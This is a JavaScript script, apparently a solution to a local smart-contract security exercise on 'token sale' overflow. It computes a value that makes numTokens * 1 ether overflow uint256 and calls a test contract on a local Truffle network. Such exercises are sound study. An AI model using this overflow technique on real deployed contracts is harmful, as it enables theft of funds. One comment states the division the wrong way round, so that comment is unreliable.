/**
 * INSTRUCTIONS
 *
 * 1. Start development network by running `truffle development`
 * 2. Copy mnemonic to the variable below and double-check localhost port is correct
 * 3. Run migration in development and re-execute all the steps: `truffle migrate --reset`
 * 4. Copy created contract address to the variable below

 *
 * INFO
 *
 * From https://cryptozombies.io/en/lesson/15/chapter/9
 * The Ethereum Virtual Machine doesn't support floating-point numbers, meaning that divisions truncate the decimals. The workaround is to simply multiply the numbers in your front-end by 10**n. The Binance API returns eight decimals numbers and we'll also multiply this by 10**10. Why did we choose 10**10? There's a reason: one ether is 10**18 wei. This way, we'll be sure that no money will be lost.
 *
 * But there's more to it. The Number type in JavaScript is "double-precision 64-bit binary format IEEE 754 value" which supports only 16 decimals...
 * Luckily, there's a small library called BN.js that'll help you overcome these issues.
 *
 * For the above reasons, it's recommended that you always use BN.js when dealing with numbers.
 *
 * SOLUTION
 *
 * We have to overflow this operation: numTokens * 1 ether
 * We also know the result of that operation is a uint256.
 * Reminder, 1 ether is 10**18 wei
 * The maximum value of that type is (2**256)-1, that is, 2**256 will overflow.
 * We end up with this equation: x * 10**18 = 2 ** 256 <=> x = (10**18) / (2 ** 256)
 * Now, because we'll never have decimals, x will result in a value slightly less that
 * the value needed to overflow.
 * For a less abstract operation think about 17 / 8 which will result in 2.125
 * Using BN library the result will actually be 2
 * So, we'll have to add 1 to x so the operation actually overflows.
 */

const HDWalletProvider = require("@truffle/hdwallet-provider");
const Web3 = require("web3");
const Web3Utils = require("web3-utils");
const fs = require("fs");
const BN = require('bn.js')

const mnemonic =
  "process pool juice infant shallow nuclear fit math win auction kitten slight";

const provider = new HDWalletProvider({
  mnemonic: {
    phrase: mnemonic,
  },
  providerOrUrl: "http://localhost:9545",
});

const web3 = new Web3(provider);

const abi = JSON.parse(
  fs.readFileSync("./1_token_sale_local/build/contracts/Test.json")
).abi;

// replace contract addresses accordingly after running `truffle migrate --reset`
const testContractAddress = "0x60d9Ef9B279A9c86e536FF7FBB856E07C57346EC";

async function main() {
  try {
    const proxyContract = new web3.eth.Contract(abi, testContractAddress);

    /**
     * Maximum safe integer
     */
    // const testValue = 2 ** 53 - 1;
    // console.log(testValue, Number.MAX_SAFE_INTEGER, testValue === Number.MAX_SAFE_INTEGER);

    const a = new BN(2, 10).pow(new BN(256, 10));
    const b = new BN(10, 10).pow(new BN(18, 10));

    const thisValueWillNotOverflow = a.div(b);
    const thisValueWillOverflow = thisValueWillNotOverflow.add(new BN(1, 10));

    console.log(thisValueWillOverflow.toString());

    proxyContract.methods
      .testOverflow(thisValueWillOverflow.toString())
      .call()
      .then(console.log);

    // I could just copy/paste the result from testOverflow method
    // But value can also be calculated like this:
    const decimals = a.mod(b);
    const amountToSend = new BN(10, 10).pow(new BN(18, 10)).sub(decimals);

    console.log(amountToSend.toString());


  } catch (ex) {
    console.warn(ex);
  } finally {
    provider.engine.stop();
  }
}

main();
